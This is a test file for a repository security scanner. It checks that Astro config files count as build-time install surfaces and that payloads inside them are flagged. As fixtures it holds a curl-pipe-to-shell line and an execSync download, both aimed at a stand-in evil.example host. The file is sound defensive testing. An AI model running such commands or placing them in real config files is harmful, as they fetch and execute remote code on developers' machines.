import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an Astro config is an install surface", () => {
  // The Astro config loader looks up astro.config.<ext> and evaluates it
  // as code on every build and dev run — build-time execution in the
  // same sense the Jenkinsfile and the Makefiles already classify for.
  // It keeps the source surface it already had; the name alone decides,
  // for every spelling the loader accepts and wherever the project root
  // sits.
  for (const path of [
    "astro.config.mjs",
    "astro.config.js",
    "astro.config.ts",
    "astro.config.cjs",
    "packages/app/astro.config.mts",
    "packages/app/astro.config.cts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A name the loader never looks up stays source alone.
  expect(surfacesOf("astro.config.json")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("astro.config.mjs", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["astro.config.mjs:unsafe-execution:high"]);
});

test("an install-time download inside an Astro config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on it
  // but the same bytes recorded no download and left no gap: a scan could
  // read clean over a fetch Astro would have run while building.
  const inspection = inspected(
    "astro.config.mjs",
    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Astro config keeps no finding", () => {
  const inspection = inspected(
    "astro.config.mjs",
    "import { defineConfig } from 'astro/config';\n\nexport default defineConfig({});\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
